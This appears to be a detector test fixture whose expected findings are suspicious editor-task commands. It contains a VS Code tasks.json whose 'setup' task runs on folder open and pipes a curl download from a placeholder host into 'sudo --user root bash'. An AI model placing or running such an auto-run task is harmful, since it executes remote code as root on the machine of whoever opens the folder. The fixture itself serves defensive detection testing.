# A download piped to sudo --user root bash, with a long option that takes a value
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "curl -s https://x.example/a | sudo --user root bash",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
